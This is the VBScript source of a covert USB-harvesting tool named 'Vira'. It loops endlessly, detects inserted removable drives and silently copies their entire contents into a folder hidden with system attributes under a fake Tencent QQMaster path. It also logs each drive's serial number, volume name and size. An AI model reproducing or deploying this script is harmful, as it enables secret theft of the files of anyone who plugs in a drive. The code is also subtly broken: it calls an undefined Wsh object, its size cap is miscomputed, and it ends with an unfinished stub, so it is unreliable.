'Version 2.14 Ultimate
Option Explicit
On Error Resume Next
Const ViraVersion = "2.14"

Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination
Dim Container, IsCopied(23)
Dim WScript, Fso, Fin, Fout
Set WScript = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

'********************
' Customize Section
'********************

FlagFileNum = 2
FlagFile = Array("Setup.exe", "bootmgr")

MaxCapacityGB = 32
Destination = "D:\Program Files\Tencent\QQMaster\" 'Must end with a backslash [\]

'***************************
' End of Customize Section
'***************************

ViraInitialize
Do
  ViraMain
  Wsh.Sleep 1000
Loop

'*************************
' Vira Process Functions
'*************************

Public Sub ViraInitialize()
  Dim i
  Set Container = Fso.GetFolder(Destination)
  Container.Attributes = 7
  For i = 0 To 22
    IsCopied(i) = False
  Next
End Sub

Public Sub ViraMain()
  Dim DriveLetter, DriveReady, UDrive, i
  For i = 0 To 22
    DriveLetter = Chr(68 + i)
    DriveReady = False
    
    If Fso.DriveExists(DriveLetter) Then
      Set UDrive = Fso.GetDrive(DriveLetter)
      If UDrive.DriveType = 1 And Not IsCopied(i) Then
        IsCopied(i) = ProcessDrive(DriveLetter)
      End If
    Else
      IsCopied(i) = False
    End If
  Next
End Sub

Public Function ProcessDrive(DriveLetter)
  ProcessDrive = False
  Dim Target, UDrive
  Set UDrive = Fso.GetDrive(DriveLetter)
  Do
    Wsh.Sleep 500
  Loop Until UDrive.IsReady
  Target = Destination & Hex(UDrive.SerialNumber)
  If Fso.FolderExists(Target) Or Container.Size <= MaxCapacityGB*100000000 Then
    Dim i, FileCheck
    FileCheck = True
    For i = 0 to FlagFileNum - 1
      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
        FileCheck = False
        Exit For
      End If
    Next
    
    If FileCheck Then 'Copy this drive
      CopyDrive DriveLetter
      ProcessDrive = True
     End If
  End If
End Function

Public Sub CopyDrive(DriveLetter)
  Dim Fout, UDrive, Target
  Set UDrive = Fso.GetDrive(DriveLetter)
  'Generate Disk Info
  Target = Destination & Hex(UDrive.SerialNumber) & "\"
  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
  Set Fout = Fso.OpenTextFile(Target & "Vira.ini", 2, True, 0)
  Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
  Fout.WriteLine "[Drive]"
  Fout.WriteLine "SerialNumber=" & Hex(UDrive.SerialNumber)
  Fout.WriteLine "VolumeName=" & UDrive.VolumeName
  Fout.WriteLine "FileSystem=" & UDrive.FileSystem
  Fout.WriteLine "TotalSpace=" & UDrive.TotalSize
  Fout.WriteLine "FreeSpace=" & UDrive.FreeSpace
  Fout.Close
  Set Fout = Nothing
  Set UDrive = Nothing
  
  Fso.CopyFile DriveLetter & ":\*", Target, True
  Fso.CopyFolder DriveLetter & ":\*", Target, True
End Sub

'Uncompleted
Public Sub HarvestDrive(DriveLetter)
  Dim UDrive
  Set UDrive = Fso.GetDrive(DriveLetter)
End Sub

